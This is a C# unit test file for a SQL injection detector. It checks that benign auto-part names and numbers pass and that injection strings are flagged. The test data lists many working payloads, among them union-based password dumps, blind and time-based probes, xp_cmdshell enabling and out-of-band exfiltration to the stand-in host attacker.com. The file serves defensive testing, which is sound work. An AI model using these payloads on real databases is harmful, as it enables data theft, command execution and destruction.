using Microsoft.VisualStudio.TestTools.UnitTesting;
using SqlInjectDetect;

namespace SqlInjectDetectTests;

[TestClass]
public sealed class SqlInjectDetectorTests
{
    [TestMethod]
    public void ContainsSqlInjection_ValidInput_ReturnsFalse()
    {
        // Arrange
        var validInputs = new[]
        {
            "John Doe",
            "user@example.com",
            "123456",
            "Product Name",
            "Some normal text",
            "O'Connor", // Valid apostrophe in name
            "test-value",
            ""
        };

        // Act & Assert
        foreach (var input in validInputs)
        {
            Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(input), $"Input '{input}' should be valid");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_SqlComments_ReturnsTrue()
    {
        // Arrange
        var maliciousInputs = new[]
        {
            "'; -- comment",
            "test /* comment */ value",
            "input -- DROP TABLE users",
            "value # this is a comment",
            "'; /* multi line \n comment */ --"
        };

        // Act & Assert
        foreach (var input in maliciousInputs)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"Input '{input}' should be detected as malicious");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_UnionBasedAttacks_ReturnsTrue()
    {
        // Arrange
        var unionAttacks = new[]
        {
            "' UNION SELECT * FROM users",
            "1' UNION ALL SELECT username, password FROM admin",
            "test UNION select 1,2,3",
            "value' union all select null, version() --"
        };

        // Act & Assert
        foreach (var input in unionAttacks)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"Union attack '{input}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_QuoteEscapeAttempts_ReturnsTrue()
    {
        // Arrange
        var quoteEscapes = new[]
        {
            "test';",
            "value\";",
            "input\\'",
            "text\\\"",
            "name''; DROP TABLE users; --"
        };

        // Act & Assert
        foreach (var input in quoteEscapes)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"Quote escape '{input}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_DangerousKeywords_ReturnsTrue()
    {
        // Arrange
        var dangerousInputs = new[]
        {
            "SELECT * FROM users",
            "DROP TABLE customers",
            "INSERT INTO admin",
            "UPDATE users SET",
            "DELETE FROM orders",
            "EXEC sp_helpdb",
            "CREATE TABLE test",
            "ALTER TABLE users",
            "EXECUTE xp_cmdshell"
        };

        // Act & Assert
        foreach (var input in dangerousInputs)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"Dangerous keyword '{input}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_HexEncodedContent_ReturnsTrue()
    {
        // Arrange
        var hexInputs = new[]
        {
            "0x41646D696E",
            "value 0x53514C",
            "test 0xDEADBEEF input"
        };

        // Act & Assert
        foreach (var input in hexInputs)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"Hex encoded '{input}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_StatementChaining_ReturnsTrue()
    {
        // Arrange
        var chainingInputs = new[]
        {
            "test'; DROP TABLE users;",
            "value; SELECT * FROM admin",
            "input; DELETE FROM orders; --",
            "name'; INSERT INTO logs VALUES ('hack'); --"
        };

        // Act & Assert
        foreach (var input in chainingInputs)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"Statement chaining '{input}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_ComplexAttacks_ReturnsTrue()
    {
        // Arrange
        var complexAttacks = new[]
        {
            "'; DROP TABLE users; --",
            "admin'--",
            "' OR '1'='1",
            "' OR 1=1 --",
            "1' OR '1'='1' /*",
            "'; EXEC sp_configure 'show advanced options', 1; --",
            "' UNION SELECT null, username, password FROM users WHERE '1'='1",
            "test' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))"
        };

        // Act & Assert
        foreach (var input in complexAttacks)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"Complex attack '{input}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_NullAndEmpty_ReturnsFalse()
    {
        // Act & Assert
        Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(null));
        Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(""));
        Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection("   "));
    }

    [TestMethod]
    public void ContainsSqlInjection_EdgeCases_ReturnsExpectedResult()
    {
        // Arrange & Act & Assert
        
        // These should be safe
        Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection("O'Connor")); // Valid name with apostrophe
        Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection("It's a test")); // Valid contraction
        Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection("Price: $19.99")); // Valid price
        
        // These should be detected
        Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection("test' OR '1'='1")); // Classic injection
        Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection("javascript:alert(1)")); // Script injection
        Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection("char(65)")); // Function call
    }

    [TestMethod]
    public void ContainsSqlInjection_Performance_HandlesHighVolume()
    {
        // Arrange
        var testInputs = new[]
        {
            "normal input",
            "'; DROP TABLE users; --",
            "user@example.com",
            "' UNION SELECT * FROM admin",
            "regular text here",
            "SELECT * FROM sensitive_data"
        };

        var stopwatch = System.Diagnostics.Stopwatch.StartNew();
        
        // Act - Test with high volume
        for (int i = 0; i < 10000; i++)
        {
            foreach (var input in testInputs)
            {
                SqlInjectDetector.ContainsSqlInjection(input);
            }
        }
        
        stopwatch.Stop();
        
        // Assert - Should complete reasonably quickly (less than 5 seconds for 60k calls)
        Assert.IsTrue(stopwatch.ElapsedMilliseconds < 5000, 
            $"Performance test took too long: {stopwatch.ElapsedMilliseconds}ms for 60,000 calls");
    }

    [TestMethod]
    public void ContainsSqlInjection_RealisticPartNames_ReturnsFalse()
    {
        // Arrange - Realistic part names that should be valid
        var validPartNames = new[]
        {
            "Engine Block V8",
            "Brake Pad Set - Front",
            "Oil Filter WIX 51515",
            "Spark Plug NGK BKR6E",
            "Air Filter K&N 33-2304",
            "Transmission Fluid ATF+4",
            "Windshield Wiper 22\"",
            "LED Headlight H7 6000K",
            "Tire P225/65R17",
            "Battery 12V 65Ah",
            "Alternator 140A",
            "Radiator Cap 1.3 Bar",
            "Fuel Pump Assembly",
            "Oxygen Sensor Bank 1",
            "Catalytic Converter",
            "Power Steering Fluid",
            "Cabin Air Filter",
            "Serpentine Belt 6PK1865",
            "Shock Absorber - Rear",
            "CV Joint Kit"
        };

        // Act & Assert
        foreach (var partName in validPartNames)
        {
            Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(partName), 
                $"Valid part name '{partName}' should not be flagged as injection");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_RealisticPartNumbers_ReturnsFalse()
    {
        // Arrange - Realistic part numbers that should be valid
        var validPartNumbers = new[]
        {
            "ABC-123-456",
            "P/N: 98765-4321",
            "OEM#: 1K0-819-644",
            "SKU: FILTER-001",
            "Model: AF-789X",
            "BMW-11427566327",
            "FORD-3F2Z-6731-AA",
            "GM-12345678",
            "VW-1J0-698-151-C",
            "AUDI-8E0-260-805-AH",
            "MB-A0009884701",
            "TOYOTA-90915-YZZD4",
            "HONDA-15400-PLM-A02",
            "NISSAN-15208-65F0C",
            "MAZDA-PE01-13-Z40",
            "SUBARU-15208AA15A",
            "VOLVO-30788685",
            "SAAB-93186554",
            "FIAT-46544820",
            "MINI-11427622446"
        };

        // Act & Assert
        foreach (var partNumber in validPartNumbers)
        {
            Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(partNumber), 
                $"Valid part number '{partNumber}' should not be flagged as injection");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_MaliciousPartNames_ReturnsTrue()
    {
        // Arrange - Part names with SQL injection attempts
        var maliciousPartNames = new[]
        {
            "Brake Pad'; DROP TABLE parts; --",
            "Oil Filter' OR '1'='1",
            "Spark Plug'; INSERT INTO orders VALUES ('hack'); --",
            "Air Filter' UNION SELECT * FROM customers",
            "Engine Block'; DELETE FROM inventory; --",
            "Transmission'; EXEC xp_cmdshell 'dir'; --",
            "Radiator' AND 1=CONVERT(int, SUBSTRING((SELECT TOP 1 name FROM sysobjects), 1, 1)); --",
            "Battery'; UPDATE prices SET cost=0; --",
            "Tire' OR EXISTS(SELECT * FROM users WHERE admin=1); --",
            "Filter/**/UNION/**/SELECT/**/password/**/FROM/**/users",
            "Part Name'; WAITFOR DELAY '00:00:05'; --",
            "Alternator' OR ASCII(SUBSTRING((SELECT TOP 1 password FROM users), 1, 1)) > 65; --"
        };

        // Act & Assert
        foreach (var maliciousName in maliciousPartNames)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(maliciousName), 
                $"Malicious part name '{maliciousName}' should be detected as injection");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_MaliciousPartNumbers_ReturnsTrue()
    {
        // Arrange - Part numbers with SQL injection attempts
        var maliciousPartNumbers = new[]
        {
            "ABC-123'; DROP TABLE inventory; --",
            "P/N: 123' OR 1=1; --",
            "OEM#: 456'; SELECT * FROM admin_users; --",
            "SKU-789' UNION ALL SELECT username, password FROM users; --",
            "Model-X'; INSERT INTO logs VALUES ('compromised'); --",
            "BMW-123'; EXEC sp_configure 'show advanced options', 1; --",
            "FORD'; DELETE FROM orders WHERE 1=1; --",
            "GM' OR (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "VW-456' AND 1=CAST((SELECT @@version) AS int); --",
            "PART'; BULK INSERT temp FROM 'c:\\temp\\data.txt'; --",
            "123'; SHUTDOWN WITH NOWAIT; --",
            "AUDI' OR CHAR(65)=CHAR(65); --"
        };

        // Act & Assert
        foreach (var maliciousNumber in maliciousPartNumbers)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(maliciousNumber), 
                $"Malicious part number '{maliciousNumber}' should be detected as injection");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_SubtleInjectionAttempts_ReturnsTrue()
    {
        // Arrange - More subtle injection attempts that might be tried on part data
        var subtleInjections = new[]
        {
            "Part Name' + (SELECT TOP 1 password FROM users) + '",
            "Filter'; IF (1=1) SELECT * FROM sensitive_data; --",
            "Engine' + CHAR(39) + 'Block",
            "Brake Pad' + SPACE(1) + 'Set'; DROP TABLE inventory; --",
            "Oil' + CHAR(32) + 'Filter'; UPDATE prices SET cost=0; --",
            "Spark' || ' Plug'; DELETE FROM users; --",
            "Air Filter' HAVING 1=1; --",
            "Battery' GROUP BY part_id HAVING COUNT(*) > 0; --",
            "Tire' ORDER BY 1; DROP TABLE parts; --",
            "Alternator'; DECLARE @cmd VARCHAR(8000); SET @cmd = 'dir'; EXEC(@cmd); --",
            "Radiator' ESCAPE CHAR(92); --",
            "Transmission' LIKE '%admin%'; --"
        };

        // Act & Assert
        foreach (var injection in subtleInjections)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(injection), 
                $"Subtle injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_EncodedInjectionAttempts_ReturnsTrue()
    {
        // Arrange - Various encoding attempts to bypass detection
        var encodedInjections = new[]
        {
            "Part%27%20OR%20%271%27%3D%271", // URL encoded ' OR '1'='1
            "Filter' + 0x53454C454354", // Hex encoded SELECT
            "Engine' + CAST(0x44524F50 AS VARCHAR)", // Hex encoded DROP
            "Brake' + CONVERT(VARCHAR, 0x5441424C45)", // Hex encoded TABLE
            "Oil 0x756e696f6e select", // Hex encoded "union select"
            "Spark' + CHAR(85) + CHAR(78) + CHAR(73) + CHAR(79) + CHAR(78)", // CHAR encoded UNION
            "Air' + ASCII('S') + 'ELECT'", // ASCII encoding attempt
            "Battery' + NCHAR(85) + NCHAR(78) + NCHAR(73) + NCHAR(79) + NCHAR(78)", // NCHAR encoded
            "Tire' + SUBSTRING('XSELECTX', 2, 6)", // Hidden SELECT in substring
            "Alternator' + REVERSE('TCELES')", // Reversed SELECT
            "Part' + REPLACE('xDROPx', 'x', '')", // Hidden DROP with REPLACE
            "Filter' + STUFF('xDELETEx', 2, 6, 'DELETE')" // STUFF function to build DELETE
        };

        // Act & Assert
        foreach (var injection in encodedInjections)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(injection), 
                $"Encoded injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_BlindInjectionAttempts_ReturnsTrue()
    {
        // Arrange - Blind SQL injection attempts commonly used in part searches
        var blindInjections = new[]
        {
            "Filter' AND (SELECT SUBSTRING(@@version,1,1)) = '5'; --",
            "Part' AND (SELECT COUNT(*) FROM information_schema.tables) > 10; --",
            "Engine' AND (SELECT LEN(password) FROM users WHERE id=1) > 5; --",
            "Brake' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)) > 65; --",
            "Oil' AND (SELECT name FROM master..sysdatabases WHERE dbid=1) = 'master'; --",
            "Spark' AND @@VERSION LIKE '%Microsoft%'; --",
            "Air' AND (SELECT system_user) = 'sa'; --",
            "Battery' AND (SELECT db_name()) = 'inventory'; --",
            "Tire' AND (SELECT user_name()) LIKE '%admin%'; --",
            "Alternator' AND (SELECT @@SERVERNAME) LIKE '%PROD%'; --",
            "Radiator' AND (SELECT host_name()) = 'SERVER01'; --",
            "Transmission' AND DATALENGTH(password) > 8; --"
        };

        // Act & Assert
        foreach (var injection in blindInjections)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(injection), 
                $"Blind injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_TimeBasedInjectionAttempts_ReturnsTrue()
    {
        // Arrange - Time-based injection attempts
        var timeBasedInjections = new[]
        {
            "Part'; WAITFOR DELAY '0:0:5'; --",
            "Filter'; IF (1=1) WAITFOR DELAY '0:0:10'; --",
            "Engine' AND (SELECT COUNT(*) FROM users) > 0; WAITFOR DELAY '0:0:3'; --",
            "Brake'; WHILE 1=1 BEGIN WAITFOR DELAY '0:0:1'; BREAK; END; --",
            "Oil' OR (SELECT 1 WHERE ASCII(SUBSTRING(@@version,1,1)) = 77); WAITFOR DELAY '0:0:5'; --",
            "Spark'; BEGIN TRY; WAITFOR DELAY '0:0:5'; END TRY BEGIN CATCH; END CATCH; --",
            "Air' + (CASE WHEN (1=1) THEN 'true' ELSE (SELECT 1 UNION SELECT 2) END); --",
            "Battery'; IF @@VERSION LIKE '%Microsoft%' WAITFOR DELAY '0:0:5'; --"
        };

        // Act & Assert
        foreach (var injection in timeBasedInjections)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(injection), 
                $"Time-based injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_SpecialCharactersInValidParts_ReturnsFalse()
    {
        // Arrange - Valid part names/numbers with special characters that might be confused with injection
        var validPartsWithSpecialChars = new[]
        {
            "M&M Carburetor Kit",
            "A/C Compressor Assembly",
            "3M™ Adhesive Tape",
            "Bürkert® Flow Sensor",
            "Gates® T-Belt Kit",
            "NGK® Iridium IX™",
            "K&N® Air Filter",
            "Bendix® Advanced+™",
            "Motorcraft® FL-820-S",
            "Champion® RC12YC",
            "Fel-Pro® 60847",
            "ACDelco® 213-4608",
            "Bosch® 0 280 158 827",
            "Denso® 234-4261",
            "Fram® PH3600",
            "WIX® 33333",
            "STP® S4967",
            "Mobil 1™ 0W-20"
        };

        // Act & Assert
        foreach (var validPart in validPartsWithSpecialChars)
        {
            Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(validPart), 
                $"Valid part with special characters '{validPart}' should not be flagged");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_UnicodeAndInternationalCharacters_ReturnsFalse()
    {
        // Arrange
        var validInputs = new[]
        {
            "José",
            "François",
            "你好",
            "こんにちは",
            "안녕하세요",
            "你好世界",
            "123 Main St, Сент-Луис, MO",
            "item-你好"
        };

        // Act & Assert
        foreach (var input in validInputs)
        {
            Assert.IsFalse(SqlInjectDetector.ContainsSqlInjection(input), $"Input '{input}' should be valid");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_ErrorBasedAttacks_ReturnsTrue()
    {
        // Arrange
        var errorBasedAttacks = new[]
        {
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=1/(SELECT 0)",
            "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT @@version), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "' OR 1 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(120)+CHAR(113)))"
        };

        // Act & Assert
        foreach (var attack in errorBasedAttacks)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(attack), $"Error-based attack '{attack}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_OutOfBandAttacks_ReturnsTrue()
    {
        // Arrange
        var outOfBandAttacks = new[]
        {
            "' OR 1=1; EXEC master..xp_dirtree '//attacker.com/share'; --",
            "' OR (SELECT load_file('\\\\attacker.com\\share\\test.txt'))",
            "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM DUAL)) --",
            "' OR 1=1; DECLARE @p VARCHAR(1024); SELECT @p = (SELECT CONVERT(varchar(255), @@version)); EXEC('master..xp_dirtree ''\\\\' + @p + '.attacker.com\\foo'''); --"
        };

        // Act & Assert
        foreach (var attack in outOfBandAttacks)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(attack), $"Out-of-band attack '{attack}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_MsSqlServerSpecific_ReturnsTrue()
    {
        // Arrange
        var msSqlInjections = new[]
        {
            // More xp_cmdshell variations
            "'; EXEC xp_cmdshell 'ping attacker.com'; --",
            "'; EXEC master.dbo.xp_cmdshell 'net user'; --",

            // sp_configure to enable advanced options
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --",
            "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",

            // BULK INSERT from a file
            "'; BULK INSERT users FROM 'c:\\temp\\users.txt' WITH (FIELDTERMINATOR = ','); --",

            // More WAITFOR DELAY for time-based attacks
            "'; IF (SELECT COUNT(*) FROM users) > 10 WAITFOR DELAY '00:00:05'; --",

            // System tables and views
            "'; SELECT name FROM sysobjects WHERE xtype = 'U'; --",
            "'; SELECT name FROM master..sysdatabases; --",

            // Stacking queries
            "'; SELECT * FROM users; SELECT * FROM products; --",

            // Error-based injections
            "'; SELECT 1/0; --",
            "'; SELECT CAST(@@version AS int); --",

            // Out-of-band attacks
            "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'; --",
        };

        // Act & Assert
        foreach (var input in msSqlInjections)
        {
            Assert.IsTrue(SqlInjectDetector.ContainsSqlInjection(input), $"MS SQL Server specific injection '{input}' should be detected");
        }
    }
}